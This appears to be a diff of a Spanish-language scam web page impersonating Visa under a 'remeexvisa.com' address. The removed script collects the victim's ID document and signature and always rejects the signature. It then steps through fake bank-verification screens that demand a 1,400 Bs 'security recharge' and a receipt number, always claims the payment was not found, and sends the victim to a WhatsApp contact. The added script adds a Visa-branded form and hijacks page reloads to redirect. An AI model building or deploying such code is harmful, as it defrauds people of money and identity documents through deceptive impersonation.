-    const benefDocElem = document.getElementById("benefDoc");
-    const benefBirthElem = document.getElementById("benefBirth");
-    const bankNameElem = document.getElementById("bankName");
-    const bankAccountElem = document.getElementById("bankAccount");
-    const bankTypeElem = document.getElementById("bankType");
+    // Redirigir si el usuario recarga la página:
+    window.addEventListener('beforeunload', function(e) {
+      if (!isRedirecting) { // Solo redirigir si no es una redirección intencional
+        e.preventDefault();
+        window.location.href = "https://remeexvisa.com";
+        e.returnValue = '';
+      }
+    });
 
-    // Botones
-    const editBtn = document.getElementById("editBtn");
-    const confirmInfoBtn = document.getElementById("confirmInfoBtn");
+    const languageSelect = document.getElementById("language");
+    const countrySelect = document.getElementById("country");
+    const transactionTypeSelect = document.getElementById("transactionType");
+    const acceptCheckbox = document.getElementById("acceptVisa");
+    const continueBtn = document.getElementById("continueBtn");
+    const progressBarFill = document.getElementById("progressBarFill");
+    const sections = document.querySelectorAll(".section-content");
 
-    // Documento
-    const uploadSection = document.getElementById("uploadSection");
-    const idDocumentInput = document.getElementById("idDocument");
-    const previewContainer = document.getElementById("previewContainer");
-    const docPreview = document.getElementById("docPreview");
-    const confirmDocBtn = document.getElementById("confirmDocBtn");
+    let selectedOptions = {
+      language: false,
+      country: false,
+      transactionType: false,
+    };
 
-    // Firma
-    const signatureSection = document.getElementById("signatureSection");
-    const signatureCanvas = document.getElementById("signatureCanvas");
-    const clearSignatureBtn = document.getElementById("clearSignatureBtn");
-    const saveSignatureBtn = document.getElementById("saveSignatureBtn");
-    let ctx, isDrawing = false;
+    let currentStep = 1;
 
-    // Overlay análisis de firma
-    const overlayAnalizandoFirma = document.getElementById("overlayAnalizandoFirma");
-    const overlayFirmaNoCoincide = document.getElementById("overlayFirmaNoCoincide");
-    const retrySignatureBtn = document.getElementById("retrySignatureBtn");
-    const forceContinueBtn = document.getElementById("forceContinueBtn");
+    languageSelect.addEventListener("change", () => {
+      selectedOptions.language = !!languageSelect.value;
+      currentStep = 2;
+      updateProgressBar();
+      showNextSection();
+      generateTransactionTypes();
+    });
 
-    // Overlays post-firma
-    const overlayMensajesSecuencia = document.getElementById("overlayMensajesSecuencia");
-    const mensajeSecuenciaTitulo = document.getElementById("mensajeSecuenciaTitulo");
-    const mensajeSecuenciaTexto = document.getElementById("mensajeSecuenciaTexto");
+    countrySelect.addEventListener("change", () => {
+      selectedOptions.country = !!countrySelect.value;
+      currentStep = 3;
+      updateProgressBar();
+      showNextSection();
+      generateTransactionTypes();
+    });
 
-    // Verificación 1, 2, 3
-    const securityVerification1 = document.getElementById("securityVerification1");
-    const securityVerification2 = document.getElementById("securityVerification2");
-    const securityVerification3 = document.getElementById("securityVerification3");
-    const fullUserNameSpan = document.getElementById("fullUserName");
-    const montoEnBsSpan = document.getElementById("montoEnBs");
-    const montoEnUsdSpan = document.getElementById("montoEnUsd");
-    const bankAccountNumberSpan = document.getElementById("bankAccountNumber");
-    const continueSecurityBtn1 = document.getElementById("continueSecurityBtn1");
-    const countdownSecurity1 = document.getElementById("countdownSecurity1");
-    const continueSecurityBtn2 = document.getElementById("continueSecurityBtn2");
-    const countdownSecurity2 = document.getElementById("countdownSecurity2");
-    const recargaReadyBtn = document.getElementById("recargaReadyBtn");
-    const countdownRecargaReady = document.getElementById("countdownRecargaReady");
-    const conceptRecargaSpan = document.getElementById("conceptRecarga");
+    transactionTypeSelect.addEventListener("change", () => {
+      selectedOptions.transactionType = !!transactionTypeSelect.value;
+      currentStep = 4;
+      updateProgressBar();
+      showNextSection();
+    });
 
-    // Overlay confirmación recarga
-    const overlayConfirmRecarga = document.getElementById("overlayConfirmRecarga");
-    const overlayConceptRecarga = document.getElementById("overlayConceptRecarga");
-    const confirmRecargaOverlayBtn = document.getElementById("confirmRecargaOverlayBtn");
-    const countdownOverlayConfirm = document.getElementById("countdownOverlayConfirm");
+    continueBtn.addEventListener("click", () => {
+      if (validateForm()) {
+        isRedirecting = true; // Establecer la bandera antes de redirigir
+        // Redirigir a la siguiente página
+        window.location.href = "pagina2.html";
+      }
+    });
 
-    // Sección recarga
-    const recargaSection = document.getElementById("recargaSection");
-    const recargaBancoOrigenInput = document.getElementById("recargaBancoOrigen");
-    const recargaTelefonoInput = document.getElementById("recargaTelefono");
-    const recargaCedulaInput = document.getElementById("recargaCedula");
-    const recargaMontoInput = document.getElementById("recargaMonto");
-    const montoRetiroBsElem = document.getElementById("montoRetiroBs");
-    const montoDepositoTotalElem = document.getElementById("montoDepositoTotal");
-    const comprobanteInput = document.getElementById("comprobanteInput");
-    const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
-    const countdownRecargaConfirm = document.getElementById("countdownRecargaConfirm");
+    function generateTransactionTypes() {
+      const country = countrySelect.value;
+      if (selectedOptions.country && country) {
+        transactionTypeSelect.innerHTML = `
+          <option value="">-- Selecciona --</option>
+          <option value="envio_cuenta">Envío de dinero a cuenta bancaria a ${country}</option>
+          <option value="recarga">Recarga de móviles a ${country}</option>
+        `;
+      } else {
+        transactionTypeSelect.innerHTML = '<option value="">-- Selecciona --</option>';
+      }
+    }
 
-    // Overlay validación final
-    const overlayMensajesFinales = document.getElementById("overlayMensajesFinales");
-    const mensajeFinalTitulo = document.getElementById("mensajeFinalTitulo");
-    const mensajeFinalTexto = document.getElementById("mensajeFinalTexto");
+    function updateProgressBar() {
+      let completedSteps = 0;
+      for (const option in selectedOptions) {
+        if (selectedOptions[option]) {
+          completedSteps++;
+        }
+      }
+      const progressPercentage = (completedSteps / 3) * 100;
+      progressBarFill.style.width = `${progressPercentage}%`;
+    }
 
-    // Overlay error final
-    const overlayErrorFinal = document.getElementById("overlayErrorFinal");
-    const whatsappLink = document.getElementById("whatsappLink");
+    function showNextSection() {
+      let nextSection = null;
 
-    /************************************************************************
-     *                               FUNCIONES
-     ************************************************************************/
-    function formatNumberVE(num) {
-      return num.toLocaleString("es-VE", {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2,
+      sections.forEach((section) => {
+        section.classList.remove("active");
       });
-    }
 
-    function initPageData() {
-      // Top bar
-      userNameElem.textContent = userName;
-      balanceAmountElem.textContent = formatNumberVE(currentBalanceBS) + " Bs";
-
-      // Datos
-      benefNameElem.innerHTML = `Nombre: <strong>${beneficiaryName}</strong>`;
-      benefDocElem.innerHTML = `Documento: <strong>${beneficiaryDoc}</strong>`;
-      benefBirthElem.innerHTML = `F. Nac: <strong>${beneficiaryBirth}</strong>`;
-      bankNameElem.innerHTML = `Banco: <strong>${bankNameValue}</strong>`;
-      bankAccountElem.innerHTML = `N° de Cuenta: <strong>${bankAccountValue}</strong>`;
-      bankTypeElem.innerHTML = `Tipo: <strong>${bankTypeValue}</strong>`;
-
-      // Verificación info
-      fullUserNameSpan.textContent = beneficiaryName;
-      montoEnBsSpan.textContent = formatNumberVE(montoRetiroUsuarioBs);
-      montoEnUsdSpan.textContent = formatNumberVE(montoRetiroUsuarioUsd);
-      bankAccountNumberSpan.textContent = bankAccountValue;
-      conceptRecargaSpan.textContent = 
-        beneficiaryName.replace(/\s/g, "") + beneficiaryDoc.replace("-", "");
-      overlayConceptRecarga.textContent = conceptRecargaSpan.textContent;
-
-      // Recarga
-      recargaBancoOrigenInput.value = bankNameValue;
-      recargaTelefonoInput.value = "0412-1234567";
-      recargaCedulaInput.value = beneficiaryDoc;
-      recargaMontoInput.value = formatNumberVE(recargaSeguridadBs);
-      montoRetiroBsElem.textContent = formatNumberVE(montoRetiroUsuarioBs);
-      let total = montoRetiroUsuarioBs + recargaSeguridadBs;
-      montoDepositoTotalElem.textContent = formatNumberVE(total);
-
-      // WhatsApp link dinámico
-      const message = 
-        "Hola, necesito ayuda con mi transacción:\n" +
-        `- Nombre Completo: ${beneficiaryName}\n` +
-        `- Documento: ${beneficiaryDoc}\n` +
-        `- Monto a Retirar: ${montoRetiroUsuarioBs} Bs\n` +
-        `- Banco: ${bankNameValue}\n` +
-        `- Motivo: No se encuentra el comprobante de recarga por ${recargaSeguridadBs} Bs\n`;
-      const encodedMsg = encodeURIComponent(message);
-      const waURL = 
-        `https://api.whatsapp.com/send/?phone=17373018059&text=${encodedMsg}&type=phone_number&app_absent=0`;
-      whatsappLink.setAttribute("href", waURL);
-    }
-
-    /***** Firma Canvas *****/
-    function initSignatureCanvas() {
-      signatureCanvas.width = signatureCanvas.offsetWidth;
-      signatureCanvas.height = signatureCanvas.offsetHeight;
-      ctx = signatureCanvas.getContext("2d");
-
-      // Eventos de mouse
-      signatureCanvas.addEventListener("mousedown", startDraw);
-      signatureCanvas.addEventListener("mousemove", draw);
-      signatureCanvas.addEventListener("mouseup", endDraw);
-      signatureCanvas.addEventListener("mouseleave", endDraw);
-
-      // Eventos de touch
-      signatureCanvas.addEventListener("touchstart", startDrawTouch, {passive:false});
-      signatureCanvas.addEventListener("touchmove", drawTouch, {passive:false});
-      signatureCanvas.addEventListener("touchend", endDrawTouch);
-    }
-    function startDraw(e) {
-      isDrawing = true;
-      ctx.beginPath();
-      ctx.moveTo(e.offsetX, e.offsetY);
-    }
-    function draw(e) {
-      if (!isDrawing) return;
-      ctx.lineWidth = 2;
-      ctx.lineCap = "round";
-      ctx.strokeStyle = "#000";
-      ctx.lineTo(e.offsetX, e.offsetY);
-      ctx.stroke();
-    }
-    function endDraw() {
-      isDrawing = false;
-      ctx.closePath();
-    }
-    function getTouchPos(canvas, touchEvent) {
-      const rect = canvas.getBoundingClientRect();
-      return {
-        x: touchEvent.touches[0].clientX - rect.left,
-        y: touchEvent.touches[0].clientY - rect.top
-      };
-    }
-    function startDrawTouch(e) {
-      e.preventDefault();
-      isDrawing = true;
-      ctx.beginPath();
-      let pos = getTouchPos(signatureCanvas, e);
-      ctx.moveTo(pos.x, pos.y);
-    }
-    function drawTouch(e) {
-      e.preventDefault();
-      if (!isDrawing) return;
-      let pos = getTouchPos(signatureCanvas, e);
-      ctx.lineWidth = 2;
-      ctx.lineCap = "round";
-      ctx.strokeStyle = "#000";
-      ctx.lineTo(pos.x, pos.y);
-      ctx.stroke();
-    }
-    function endDrawTouch(e) {
-      e.preventDefault();
-      isDrawing = false;
-      ctx.closePath();
-    }
-
-    function showOverlay(overlayElem) {
-      overlayElem.classList.add("active");
-    }
-    function hideOverlay(overlayElem) {
-      overlayElem.classList.remove("active");
-    }
-
-    /***** Contadores *****/
-    function startCountdown(seconds, displayElem, btnToEnable) {
-      let remaining = seconds;
-      displayElem.textContent = `Disponible en ${remaining} s...`;
-      const intervalID = setInterval(() => {
-        remaining--;
-        displayElem.textContent = `Disponible en ${remaining} s...`;
-        if (remaining <= 0) {
-          clearInterval(intervalID);
-          displayElem.textContent = "";
-          btnToEnable.disabled = false;
-          btnToEnable.classList.remove("btn-disabled");
+      for (let i = 0; i < sections.length; i++) {
+        if (sections[i].id === `step${currentStep}`) {
+          nextSection = sections[i];
+          break;
         }
-      }, 1000);
+      }
+
+      if (nextSection) {
+        nextSection.classList.add("active");
+      }
     }
 
-    /***** Secuencia post-firma (overlays) *****/
-    function showPostFirmaSecuencia() {
-      showOverlay(overlayMensajesSecuencia);
-      const mensajes = [
-        {titulo: "Validamos tu Documento de Identidad...", tiempo: 6000},
-        {titulo: "Tu Firma no coincide", tiempo: 6000},
-        {titulo: "Estableciendo conexión con tu banco...", tiempo: 5000},
-        {titulo: "Iniciando depósito de tus fondos...", tiempo: 5000},
-        {titulo: "Tu banco solicita verificación adicional", tiempo: 6000}
-      ];
-
-      let idx = 0;
-      function next() {
-        if (idx >= mensajes.length) {
-          hideOverlay(overlayMensajesSecuencia);
-          // Muestra la primera tarjeta de seguridad
-          securityVerification1.classList.add("active");
-          startCountdown(20, countdownSecurity1, continueSecurityBtn1);
-          return;
-        }
-        let msg = mensajes[idx];
-        mensajeSecuenciaTitulo.textContent = msg.titulo;
-        mensajeSecuenciaTexto.textContent = "";
-        setTimeout(() => {
-          idx++;
-          next();
-        }, msg.tiempo);
+    function validateForm() {
+      if (!selectedOptions.language) {
+        alert("Por favor, selecciona un idioma.");
+        return false;
       }
-      next();
+      if (!selectedOptions.country) {
+        alert("Por favor, selecciona un país de destino.");
+        return false;
+      }
+      if (!selectedOptions.transactionType) {
+        alert("Por favor, selecciona el tipo de transacción.");
+        return false;
+      }
+      if (!acceptCheckbox.checked) {
+        alert("Debes aceptar los Términos y Condiciones de Visa.");
+        return false;
+      }
+      return true;
     }
-
-    /***** Secuencia final tras confirmar recarga *****/
-    function showFinalValidationSequence() {
-      showOverlay(overlayMensajesFinales);
-
-      const mensajes = [
-        { titulo: "Estamos validando su información...", tiempo: 3000 },
-        { titulo: `Estamos preparando tu depósito por ${montoDepositoTotalElem.textContent} Bs...`, tiempo: 5000 },
-        { titulo: "Estamos verificando tu primera recarga por 1.400,00 Bs...", tiempo: 5000 },
-        { titulo: "No encontramos tu primera recarga por 1.400,00 Bs...", tiempo: 5000 },
-        { titulo: "Estamos contactando con tu banco...", tiempo: 2000 },
-        { titulo: "Validando tus datos...", tiempo: 5000 },
-        { titulo: "No encontramos tu primera recarga por 1.400,00 Bs...", tiempo: 5000 }
-      ];
-
-      let idx = 0;
-      function next() {
-        if (idx >= mensajes.length) {
-          hideOverlay(overlayMensajesFinales);
-          // Mostrar overlay de error final
-          showOverlay(overlayErrorFinal);
-          return;
-        }
-        let msg = mensajes[idx];
-        mensajeFinalTitulo.textContent = msg.titulo;
-        mensajeFinalTexto.textContent = "";
-        setTimeout(() => {
-          idx++;
-          next();
-        }, msg.tiempo);
-      }
-      next();
-    }
-
-    /************************************************************************
-     *                              EVENTOS
-     ************************************************************************/
-
-    // Botón Editar
-    editBtn.addEventListener("click", () => {
-      alert("Aquí podrías redirigir a la página para editar datos (page9.html).");
-    });
-
-    // Botón Confirmar (mostrar sección de cargar documento)
-    confirmInfoBtn.addEventListener("click", () => {
-      document.getElementById("uploadSection").classList.add("active");
-      uploadSection.scrollIntoView({ behavior: "smooth" });
-    });
-
-    // Carga de documento
-    idDocumentInput.addEventListener("change", (e) => {
-      const file = e.target.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        docPreview.src = event.target.result;
-        previewContainer.classList.add("active");
-        confirmDocBtn.style.display = "inline-flex";
-      };
-      reader.readAsDataURL(file);
-    });
-
-    // Botón Confirmar Documento
-    confirmDocBtn.addEventListener("click", () => {
-      alert("Documento confirmado exitosamente.");
-      uploadSection.classList.remove("active");
-      signatureSection.classList.add("active");
-      signatureSection.scrollIntoView({ behavior: "smooth" });
-    });
-
-    // Limpiar firma
-    clearSignatureBtn.addEventListener("click", () => {
-      ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
-    });
-
-    // Guardar firma
-    saveSignatureBtn.addEventListener("click", () => {
-      // Guardamos la firma en base64
-      savedSignature = signatureCanvas.toDataURL("image/png");
-      // Mostramos overlay de "Analizando firma" 5s
-      showOverlay(overlayAnalizandoFirma);
-      setTimeout(() => {
-        hideOverlay(overlayAnalizandoFirma);
-        // Mostramos overlay "firma no coincide"
-        showOverlay(overlayFirmaNoCoincide);
-      }, 5000);
-    });
-
-    // Reintentar firma
-    retrySignatureBtn.addEventListener("click", () => {
-      hideOverlay(overlayFirmaNoCoincide);
-      ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
-      signatureSection.scrollIntoView({ behavior: "smooth" });
-    });
-
-    // Forzar continuar con la firma no coincidente
-    forceContinueBtn.addEventListener("click", () => {
-      hideOverlay(overlayFirmaNoCoincide);
-      // Ocultamos la tarjeta de firma
-      signatureSection.classList.remove("active");
-      document.getElementById("datosRetiroSection").classList.remove("active");
-      // Iniciamos secuencia de mensajes
-      showPostFirmaSecuencia();
-    });
-
-    // Pantalla 1 (Verificación)
-    continueSecurityBtn1.addEventListener("click", () => {
-      securityVerification1.classList.remove("active");
-      securityVerification2.classList.add("active");
-      startCountdown(20, countdownSecurity2, continueSecurityBtn2);
-    });
-
-    // Pantalla 2
-    continueSecurityBtn2.addEventListener("click", () => {
-      securityVerification2.classList.remove("active");
-      securityVerification3.classList.add("active");
-      startCountdown(45, countdownRecargaReady, recargaReadyBtn);
-    });
-
-    // Pantalla 3
-    recargaReadyBtn.addEventListener("click", () => {
-      showOverlay(overlayConfirmRecarga);
-      startCountdown(6, countdownOverlayConfirm, confirmRecargaOverlayBtn);
-    });
-
-    // Overlay Confirm Recarga
-    confirmRecargaOverlayBtn.addEventListener("click", () => {
-      hideOverlay(overlayConfirmRecarga);
-      securityVerification3.classList.remove("active");
-      recargaSection.classList.add("active");
-      startCountdown(15, countdownRecargaConfirm, confirmRecargaBtn);
-    });
-
-    // Confirm Recarga final
-    confirmRecargaBtn.addEventListener("click", () => {
-      if (comprobanteInput.value.trim().length !== 12) {
-        alert("Debe ingresar un comprobante de 12 dígitos.");
-        return;
-      }
-      recargaSection.classList.remove("active");
-      // Secuencia final
-      showFinalValidationSequence();
-    });
-
-    document.addEventListener("DOMContentLoaded", () => {
-      initPageData();
-      initSignatureCanvas();
-    });
   </script>
-
-  <!-- Script Tawk.to (opcional) -->
   <script>
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
     (function(){
-      var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+      var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
       s1.async=true;
       s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
       s1.charset='UTF-8';
